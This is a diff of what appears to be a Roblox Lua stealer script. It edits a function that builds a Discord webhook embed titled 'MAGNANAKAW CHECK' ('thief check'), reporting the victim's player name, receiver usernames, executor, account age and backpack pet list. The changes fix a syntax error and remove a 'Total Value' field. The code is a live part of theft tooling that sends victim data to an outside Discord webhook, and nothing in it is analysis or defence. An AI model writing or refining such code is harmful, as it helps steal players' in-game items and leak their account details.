@@ -105,11 +105,11 @@ end
 -- Send Discord webhook embed
 local function createDiscordEmbed(petList, totalValue, fileUrl)
     local embed = {
-        title = "MAGNANAKAW CHECK 🦾🥀",
+        title = "MAGNANAKAW CHECK 🥀",
         color = 65280,
         fields = {
             {
-                name = **Player Information**",
+                name = "**Player Information**",
                 value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
                     LocalPlayer.Name, 
                     table.concat(USERNAMES, " "), 
@@ -118,11 +118,7 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
                 ),
                 inline = false
             },
-            {
-                name = "**Total Value**",
-                value = string.format("```%sÃ‚Â¢```", totalValue),
-                inline = false
-            },
+          
             {
                 name = "**Backpack**",
                 value = string.format("```%s```", petList),
